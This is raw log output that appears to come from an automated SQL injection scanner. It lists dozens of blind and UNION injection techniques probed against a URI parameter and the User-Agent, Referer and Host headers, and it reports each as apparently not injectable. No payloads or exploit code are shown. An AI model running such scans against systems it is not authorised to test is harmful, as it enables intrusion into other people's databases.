[18:50:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:50:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:50:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:50:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:50:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:50:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:50:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:50:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:51:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:51:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:03] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:07] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:08] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:08] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:51:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:51:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:51:09] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:51:09] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:51:09] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:09] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:51:09] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:09] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:09] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:09] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:09] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:51:09] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:51:09] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:51:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:51:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:51:10] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:51:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:51:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:51:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:51:12] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:51:13] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:51:13] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:51:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:51:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:51:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:51:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:51:15] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[18:51:15] [INFO] testing if parameter 'User-Agent' is dynamic
[18:51:15] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[18:51:15] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[18:51:15] [INFO] testing for SQL injection on parameter 'User-Agent'
[18:51:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:51:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:51:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:51:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:51:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:51:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:51:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:51:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:51:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:51:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:51:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:51:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:19] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:51:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:22] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:23] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:24] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:51:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:51:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:51:25] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:51:25] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:51:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:51:25] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:25] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:25] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:25] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:51:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:51:25] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:51:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:51:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:51:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:51:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:51:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:51:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:51:27] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:51:27] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:51:27] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:51:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:51:28] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:51:29] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:51:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:51:30] [WARNING] parameter 'User-Agent' does not seem to be injectable
[18:51:30] [INFO] testing if parameter 'Referer' is dynamic
[18:51:30] [WARNING] parameter 'Referer' does not appear to be dynamic
[18:51:30] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[18:51:30] [INFO] testing for SQL injection on parameter 'Referer'
[18:51:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:51:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:51:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:51:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:51:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:51:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:51:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:51:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:51:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:34] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:51:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:36] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:36] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:37] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:37] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:38] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:38] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:39] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:51:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:51:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:51:39] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:51:39] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:51:39] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:51:39] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:51:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:39] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:39] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:51:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:51:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:51:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:51:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:51:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:51:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:51:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:51:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:51:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:51:41] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:51:41] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:51:42] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:51:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:51:43] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:51:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:51:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:51:44] [WARNING] parameter 'Referer' does not seem to be injectable
[18:51:44] [INFO] testing if parameter 'Host' is dynamic
[18:51:44] [WARNING] parameter 'Host' does not appear to be dynamic
[18:51:44] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[18:51:44] [INFO] testing for SQL injection on parameter 'Host'
[18:51:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:51:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:51:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:51:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:51:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:51:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:51:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:51:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:51:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:51:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:51:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:51:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:51:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:51:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:51:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:51:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:51:52] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:52] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:51:53] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:53] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:51:54] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:54] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:51:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:51:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:51:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:51:55] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:51:55] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:51:55] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:51:55] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:51:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:51:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:51:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:51:55] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:55] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:51:55] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
